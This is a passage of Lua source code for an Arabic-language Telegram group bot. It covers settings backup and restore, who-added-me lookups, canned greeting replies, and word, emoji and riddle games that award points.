GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Monshs ~= 0 then
GetJson = GetJson..'"Monshs":['
for k,v in pairs(Monshs) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #AbsMonshs ~= 0 then
GetJson = GetJson..'"AbsMonshs":['
for k,v in pairs(AbsMonshs) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..DevFeras..'.json', '⌁︙يحتوي الملف على ↫ '..#list..' مجموعه',dl_cb, nil)
end
if text == 'رفع النسخه' and tonumber(msg.reply_to_message_id_) > 0 or text == 'رفع النسخه الاحتياطيه' and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
--     Source DevFeras     --
if text and text:match("منو ضافني") then
if not DevFeras:get(DevFeras..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*انت منشئ المجموعه*', 1, 'md') 
return false
end
local Added_Me = DevFeras:get(DevFeras.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = '⌁︙*الشخص الذي قام باضافتك هو* ↫ '..Name
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*انت دخلت عبر الرابط*', 1, 'md') 
end
end,nil)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*امر منو ضافني تم تعطيله من قبل المدراء*', 1, 'md') 
end
end
--     Source DevFeras     --
if DevFeras:get(DevFeras.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Feras( msg.chat_id_, msg.id_, 1,"⌁︙يوجد فقط ( 6 ) اختيارات\n⌁︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevFeras:get(DevFeras.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevFeras:del(DevFeras.."SET:GAME"..msg.chat_id_)   
Dev_Feras( msg.chat_id_, msg.id_, 1,'⌁︙*المحيبس باليد رقم* ↫ '..NUM..'\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevFeras:incrby(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevFeras:del(DevFeras.."SET:GAME"..msg.chat_id_)   
Dev_Feras( msg.chat_id_, msg.id_, 1,'⌁︙*المحيبس باليد رقم* ↫ '..GETNUM..'\n⌁︙*للاسف لقد خسرت حاول مره اخرى للعثور على المحيبس*', 1, "md")
end
end
end
if DevFeras:get(DevFeras.."bot:support:link" .. msg.sender_user_id_) then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local abs = "bot:supports:link"
DevFeras:set(DevFeras..abs, glink)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ رابط كروب الدعم الجديد ", 1, "md")
DevFeras:del(DevFeras.."bot:support:link" .. msg.sender_user_id_)
elseif msg.content_.text_:match("^@(.*)[Bb][Oo][Tt]$") or msg.content_.text_:match("^@(.*)_[Bb][Oo][Tt]$") then
local bID = msg.content_.text_:match("@(.*)")
local abs = "bot:supports:link"
DevFeras:set(DevFeras..abs, bID)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ معرف الدعم الجديد ", 1, "md")
DevFeras:del(DevFeras.."bot:support:link" .. msg.sender_user_id_)
end
end
if DevFeras:get(DevFeras..'DevFeras4'..msg.sender_user_id_) then
DevFeras:del(DevFeras..'DevFeras4'..msg.sender_user_id_)
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatAdministrators?chat_id='..msg.content_.text_..'')
local data = json:decode(url)
if res == 400 then
if data.description == "Bad Request: supergroup members are unavailable" then 
Dev_Feras(msg.chat_id_,msg.id_, 1, "⌁︙*لم ترفعني ادمن في قناتك ارفعني اولا*", 1 , "md")
return false 
elseif data.description == "Bad Request: chat not found" then 
Dev_Feras(msg.chat_id_,msg.id_, 1, "⌁︙*هذا المعرف غير صحيح*", 1 , "md")
return false
end end 
if not msg.content_.text_ then
Dev_Feras(msg.chat_id_,msg.id_, 1, "⌁︙*هذا المعرف غير صحيح*", 1 , "md")
return false
end
local CH_BOT = msg.content_.text_:match("(.*)")
DevFeras:set(DevFeras..'DevFeras3',CH_BOT)
Dev_Feras(msg.chat_id_,msg.id_, 1, "⌁︙تم حفظ قناة الاشتراك الاجباري\n⌁︙الان قم برفع البوت ادمن في القناة \n⌁︙بعدها قم بتفعيل الاشتراك الاجباري ", 1 , "html")
return false
end
--     Source DevFeras     --
if DevFeras:get(DevFeras.."bot:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
DevFeras:del(DevFeras.."bot:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevFeras:set(DevFeras.."DevText", DevText)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ كليشة المطور", 1, "md")
end
if text and text:match("^(.*)$") then
local Feras_dev = DevFeras:get('Feras_dev:'..bot_id..'namebot'..msg.sender_user_id_..'')
if Feras_dev == 'msg' then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ اسم البوت ', 1, 'html')
DevFeras:set('Feras_dev:'..bot_id..'namebot'..msg.sender_user_id_..'', 'no')
DevFeras:set('Feras_dev:'..bot_id..'name_bot', text)
return false 
end
end
--     Source DevFeras     --
if text:match("^الرابط$") and ChCheck(msg) then
if not DevFeras:get(DevFeras.."bot:tt:link:"..msg.chat_id_) then 
local link = DevFeras:get(DevFeras.."bot:group:link"..msg.chat_id_)
if link then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌 ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..link, 1, "html")
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لم يتم تعيين رابط المجموعه \n⌁︙ارسل (ضع رابط) للتعيين', 1, 'md')
end
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*جلب رابط المجموعه معطل*', 1, 'md')
end
end
--     Source DevFeras     --
Dev_Feras(msg.chat_id_, msg.id_, 1,rd, 1, 'html')
end 
getUser(msg.sender_user_id_,rd_anshb)
end end
if text == 'الو' or text == 'الوو' or text == 'الووو' then if not DevFeras:get(DevFeras..'bot:rep:mute'..msg.chat_id_) then Feras_dev =  "هلا يلبى وش بغيت ؟" else Feras_dev = '' end Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end
if text == 'السلام عليكم' or text == 'سلام عليكم' or text == 'السلام عليكم ورحمه الله'  or text == 'السلام عليكم ورحمه الله وبركاته' or text == 'السلام عليكم ورحمه الله وبركاتة' then if not DevFeras:get(DevFeras..'bot:rep:mute'..msg.chat_id_) then Feras_dev =  "وعليكم السلام ورحمه الله وبركاته ياهلا منور " else Feras_dev = '' end Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end
if text == '😭💔' or text == '😭😭' or text == '😭😭😭' or text == '😭😭😭' or text == '😭😭😭😭' then if not DevFeras:get(DevFeras..'bot:rep:mute'..msg.chat_id_) then Feras_dev =  "مين مزعلك ؟梁" else Feras_dev = '' end Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end
if text == 'باي' or text == 'بااي' or text == 'اروح' or text == 'اروح احسن' or text == 'اولي احسن' or text == 'راح اروح' or text == 'باي انام' then if not DevFeras:get(DevFeras..'bot:rep:mute'..msg.chat_id_) then Feras_dev =  "لاتطول الغيبه بنشتاق 梁" else Feras_dev = '' end Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end
if text == 'هاي' or text == 'هلاو' or text == 'هلا' or text == 'هلاوو' or text == 'هيلاو' or text == 'هيلاوو' or text == 'هلاا' then if not DevFeras:get(DevFeras..'bot:rep:mute'..msg.chat_id_) then local Feras_dev = {  "ابك وش ذا النور الي حاء فجاءه ؟" } DevFeras2 = math.random(#Feras_dev) Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev[DevFeras2] , 1, 'md') end end
if text == 'وينك' or text == 'وين انتي' then  if not DevFeras:get(DevFeras..'bot:rep:mute'..msg.chat_id_) then Feras_dev =  "موجود يروحي اطلب بس" else Feras_dev = '' end Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end
if text == 'ميته انتي' then  if not DevFeras:get(DevFeras..'bot:rep:mute'..msg.chat_id_) then Feras_dev =  "ترا مو عشاني بوت م انا تعال وقت ثاني ماني فاضيه لكۦ" else  Feras_dev = '' end  Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end
if text == 'فرخ' then  if not DevFeras:get(DevFeras..'bot:rep:mute'..msg.chat_id_) then Feras_dev =  "ٰاتفق️" else  Feras_dev = '' end  Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end
if text == 'سورسك بيض' or text == 'السورس حقك مو حلو' or text == 'سورسك تعبان' or text == 'سورسك زباله' then if not DevFeras:get(DevFeras..'bot:rep:mute'..msg.chat_id_) then Feras_dev =  "لاتسب لا اعطيك ب النعال" else Feras_dev = '' end Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end 
--     Source DevFeras     --
if text == 'بوت' or text == 'بوتت' then name_bot = (DevFeras:get('Feras_dev:'..bot_id..'name_bot') or 'Feras') local Feras_dev = {  "هلا اسمي "..name_bot.." يلبى",  "عندي اسم يسطا 梁",  "  "..name_bot.." طفشت من اسم بالوت سموني كذا",  "انت البوت يورع", } DevFeras2 = math.random(#Feras_dev) Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev[DevFeras2] , 1, 'md') end
if text == 'اسم البوت' or text == 'وش اسم البوت' or text == 'شسم البوت' or text == 'البوت وش اسمه'  then name_bot = (DevFeras:get('Feras_dev:'..bot_id..'name_bot') or 'Feras') local Feras_dev = {  "يا هلا اول مره اشوف احد يسأل عن اسمي \nاسمي "..name_bot.." 梁️",  "ذا اسمي يلبى "..name_bot.." ", } DevFeras2 = math.random(#Feras_dev) Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev[DevFeras2] , 1, 'md') end
if text ==  ""..name_bot..' احبك' or text ==  ""..name_bot..' احبج' then name_bot = (DevFeras:get('Feras_dev:'..bot_id..'name_bot') or 'Feras') local Feras_dev = {  " اخخخخخ انا اكثر امواح"..name_bot.." ",  "انت راسمياً زوجي الجديد خل المطور سحب علي梁" } DevFeras2 = math.random(#Feras_dev) Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev[DevFeras2] , 1, 'md') end
if (text and text == (DevFeras:get('Feras_dev:'..bot_id..'name_bot') or 'Feras')) then name_bot = (DevFeras:get('Feras_dev:'..bot_id..'name_bot') or 'Feras') local namebot = {  'هلا يلقبي'..name_bot..' تفضل',  'مصختنها وانا اختك',  'اخخخخ احبك'..name_bot..' 殺',  'طاط✌' } name = math.random(#namebot) Dev_Feras(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') return false end
--     Source DevFeras     --
if text =='نقاطي' and ChCheck(msg) then 
if tonumber((DevFeras:get(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
DevFeras0 = '⌁︙ليس لديك نقاط العب اولا \n⌁︙ارسل ( الالعاب ) للعب'
Dev_Feras(msg.chat_id_, msg.id_, 1,DevFeras0, 1, 'md')
else 
Feras_dev = '⌁︙عدد النقاط التي ربحتها ↫ '..(DevFeras:get(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_))
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevFeras:del(DevFeras..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع رسائلك', 1, 'md') end
--     Source DevFeras     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) then
if not DevFeras:get(DevFeras..'bot:lock_geam'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevFeras:del(DevFeras..'bot:l:ids'..msg.chat_id_)
DevFeras2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevFeras2[math.random(#DevFeras2)]
DevFeras:set(DevFeras..'bot:klmos'..msg.chat_id_,name)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'📤','📤')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'🛢','🛢')
name = string.gsub(name,'📒','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
Feras_dev = '⌁︙اول واحد يدز هذا السمايل {'..name..'} يربح '
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
end end
if text == ''..(DevFeras:get(DevFeras..'bot:klmos'..msg.chat_id_) or 'qssp')..'' and not DevFeras:get(DevFeras..'bot:l:ids'..msg.chat_id_) then
if not DevFeras:get(DevFeras..'bot:l:ids'..msg.chat_id_) then 
Feras_dev = '⌁︙لقد ربحت وحصلت على نقطه \n⌁︙ارسل ( سمايلات ) للعب مره اخرى \n '
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
DevFeras:incrby(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevFeras:set(DevFeras..'bot:l:ids'..msg.chat_id_,true)
end
if text == 'ترتيب' and ChCheck(msg) or text == 'الترتيب' and ChCheck(msg) then
if not DevFeras:get(DevFeras..'bot:lock_geam'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevFeras:del(DevFeras..'bot:l:id'..msg.chat_id_)
DevFeras2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = DevFeras2[math.random(#DevFeras2)]
DevFeras:set(DevFeras..'bot:klmo'..msg.chat_id_,name)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
Feras_dev = '⌁︙اول واحد يرتبها {'..name..'} يربح '
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
end end
if text == ''..(DevFeras:get(DevFeras..'bot:klmo'..msg.chat_id_) or 'qssp')..'' and not DevFeras:get(DevFeras..'bot:l:id'..msg.chat_id_) then
if not DevFeras:get(DevFeras..'bot:l:id'..msg.chat_id_) then 
Feras_dev = '⌁︙لقد ربحت وحصلت على نقطه \n⌁︙ارسل ( ترتيب ) للعب مره اخرى \n '
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
DevFeras:incrby(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevFeras:set(DevFeras..'bot:l:id'..msg.chat_id_,true)
end
if text == 'محيبس' and ChCheck(msg) or text == 'بات' and ChCheck(msg) or text == 'المحيبس' and ChCheck(msg) then
if not DevFeras:get(DevFeras..'bot:lock_geam'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
Num = math.random(1,6)
DevFeras:set(DevFeras.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀       ➁       ➂       ➃       ➄       ➅
↓       ↓       ↓       ↓       ↓       ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿

⌁︙اختر رقم لاستخراج المحيبس
⌁︙الفائز يحصل على (5) نقاط
]]
Dev_Feras( msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
DevFeras:setex(DevFeras.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
if text == 'حزوره' and ChCheck(msg) or text == 'الحزوره' and ChCheck(msg) then
if not DevFeras:get(DevFeras..'bot:lock_geam'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevFeras:del(DevFeras..'bot:l:id'..msg.chat_id_)
DevFeras2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = DevFeras2[math.random(#DevFeras2)]
DevFeras:set(DevFeras..'bot:bkbk'..msg.chat_id_,name)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
Feras_dev = '⌁︙اول واحد يحلها {'..name..'} يربح '
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
end end
if text == ''..(DevFeras:get(DevFeras..'bot:bkbk'..msg.chat_id_) or 'qssp')..'' and not DevFeras:get(DevFeras..'bot:l:id'..msg.chat_id_) then
if not DevFeras:get(DevFeras..'bot:l:id'..msg.chat_id_) then 
Feras_dev = '⌁︙لقد ربحت وحصلت على نقطه \n⌁︙ارسل ( حزوره ) للعب مره اخرى \n '
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
DevFeras:incrby(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
